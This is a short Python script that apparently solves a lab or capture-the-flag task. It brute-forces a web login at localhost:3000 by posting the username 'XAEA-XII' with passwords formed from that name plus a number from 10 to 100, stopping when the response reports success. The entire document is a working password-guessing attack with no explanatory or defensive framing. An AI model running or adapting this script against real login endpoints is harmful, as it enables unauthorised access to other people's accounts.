import requests
import json
url = "http://localhost:3000/login"
username = "XAEA-XII"
for i in range(10,101):
    http = requests.post(url, json = {'username':username,'password':f"{username}{i}",'login':"login"})
    #print(http.response_code)
    content = http.json()
    if content['success'] == True:
        print("password is "+ f"{username}{i}")
        exit()